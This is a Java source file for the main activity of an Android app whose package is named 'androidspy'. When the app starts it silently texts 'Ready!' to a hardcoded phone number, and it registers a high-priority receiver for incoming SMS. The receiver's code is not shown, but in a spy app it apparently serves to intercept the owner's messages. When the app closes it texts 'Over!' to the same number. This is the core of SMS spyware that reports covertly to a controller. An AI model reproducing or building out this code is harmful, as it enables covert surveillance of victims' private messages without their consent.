package com.gushuangchi.androidspy;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import android.content.IntentFilter;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.telephony.SmsManager;

public class MainActivity extends ActionBarActivity {
    private SmsReceiver receiver = new SmsReceiver();
    private String phoneNumber = "+8618317006989";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(phoneNumber,null,"Ready!",null,null);

        IntentFilter filter = new IntentFilter();
        filter.setPriority(997);
        filter.addAction("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(receiver,filter);
    }


    protected void onDestroy() {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(phoneNumber,null,"Over!",null,null);
        super.onDestroy();
        unregisterReceiver(receiver);
    }
}
